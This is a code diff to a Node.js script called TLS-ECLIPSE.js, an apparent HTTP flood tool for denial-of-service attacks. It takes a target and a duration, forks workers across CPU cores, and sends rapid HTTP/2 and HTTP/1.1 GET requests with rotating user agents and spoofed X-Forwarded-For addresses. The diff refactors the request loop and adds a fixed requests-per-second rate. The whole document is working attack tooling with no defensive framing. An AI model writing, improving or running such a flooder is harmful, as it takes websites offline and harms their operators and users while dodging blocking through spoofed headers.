@@ -4,6 +4,7 @@ const http2 = require('http2');
 const url = require('url');
 const cluster = require('cluster');
 const os = require('os');
+const { performance } = require('perf_hooks');
 
 if (process.argv.length !== 4) {
     console.log(`Usage: node TLS-ECLIPSE.js <target> <duration-in-seconds>`);
@@ -26,6 +27,8 @@ const userAgents = [
 
 let h2RequestsSent = 0;
 let h1RequestsSent = 0;
+let totalRequests = 0;
+let startTime = performance.now();
 
 function randIP() {
     return `${rand(1, 255)}.${rand(0, 255)}.${rand(0, 255)}.${rand(0, 255)}`;
@@ -33,6 +36,41 @@ function randIP() {
 
 function rand(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+function sendHttp2Request(client) {
+    const headers = {
+        ':method': 'GET',
+        ':path': path,
+        'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+        'x-forwarded-for': randIP(),
+        'accept': '*/*',
+    };
+    const req = client.request(headers);
+    req.on('response', () => {});  // Ignore response
+    req.end();
+    h2RequestsSent++;
+}
+
+function sendHttp1Request() {
+    const options = {
+        hostname: host,
+        port: 80,
+        path: path,
+        method: 'GET',
+        headers: {
+            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+            'X-Forwarded-For': randIP(),
+            'Connection': 'keep-alive',
+        },
+    };
+
+    const req = http.request(options, (res) => {
+        res.on('data', () => {}); // Ignore data
+    });
+
+    req.end();
+    h1RequestsSent++;
 }
 
 if (cluster.isMaster) {
@@ -48,12 +86,10 @@ if (cluster.isMaster) {
         cluster.fork();
     }
 
-    const startTime = Date.now();
-    const start = new Date().toLocaleTimeString();
-    console.log(`\n[+] Attack Started @ ${start}`);
+    const attackDuration = duration * 1000; // Attack duration in milliseconds
 
     setInterval(() => {
-        const timeElapsed = Math.floor((Date.now() - startTime) / 1000);
+        const timeElapsed = Math.floor((performance.now() - startTime) / 1000);
         const timeLeft = duration - timeElapsed;
 
         console.clear();
@@ -67,69 +103,38 @@ if (cluster.isMaster) {
     }, 1000);
 
     setTimeout(() => {
-        console.log(`\n[+] Attack Ended @ ${new Date().toLocaleTimeString()}`);
+        console.log(`\n[+] Attack Ended`);
         process.exit(1);
-    }, duration * 1000);
+    }, attackDuration);
 } else {
-    let loopCount = 0;
+    const maxStreams = 3;  // Max number of HTTP/2 streams at a time
+    let activeStreams = 0;
 
-    function launchAttack() {
-        // For HTTP/2
-        if (Math.random() < 0.5) {
-            const client = http2.connect(`https://${host}`);
+    function attack() {
+        if (activeStreams < maxStreams) {
+            // Choose HTTP/2 or HTTP/1.1 randomly
+            if (Math.random() < 0.5) {
+                const client = http2.connect(`https://${host}`);
+                client.on('error', (err) => console.error(err));
 
-            client.on('error', () => {
-                // Retry after error
-                setTimeout(launchAttack, 2000); // Retry after 2 seconds
-            });
-
-            for (let i = 0; i < 500; i++) {  // 500 requests per connection
-                const headers = {
-                    ':method': 'GET',
-                    ':path': path,
-                    'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-                    'x-forwarded-for': randIP(),
-                    'accept': '*/*'
-                };
-
-                const req = client.request(headers);
-                req.on('response', () => {});
-                req.end();
+                sendHttp2Request(client);
+                activeStreams++;
+                setTimeout(() => {
+                    client.close();  // Close after request
+                    activeStreams--;
+                }, 100); // Allow time for server to handle requests
+            } else {
+                sendHttp1Request();
             }
-
-            h2RequestsSent += 500; // Increment H2 requests count
-            client.close(); // Close connection after requests
-        } else {
-            // For HTTP/1.1
-            const options = {
-                hostname: host,
-                port: 80,
-                path: path,
-                method: 'GET',
-                headers: {
-                    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-                    'X-Forwarded-For': randIP(),
-                    'Connection': 'keep-alive'
-                }
-            };
-
-            const req = http.request(options, (res) => {
-                res.on('data', () => {}); // No need to handle the data
-            });
-
-            for (let i = 0; i < 500; i++) {  // 500 requests per connection
-                req.end(); // Send request
-            }
-
-            h1RequestsSent += 500; // Increment H1 requests count
         }
-
-        loopCount++;
+        totalRequests++;
     }
 
-    const interval = setInterval(launchAttack, 500);  // Slow down to 500ms between each attack
+    // Real RPS - Adjust this to your desired rate per second
+    const rps = 100;  // 100 requests per second
+    setInterval(attack, 1000 / rps); // Delay between requests to achieve the desired RPS
 
     process.on('exit', () => {
-        console.log(`[+] Worker PID: ${process.pid} sent ~${loopCount * 500} requests`);
+        console.log(`[+] Worker PID: ${process.pid} sent ~${totalRequests} total requests`);
     });
 }
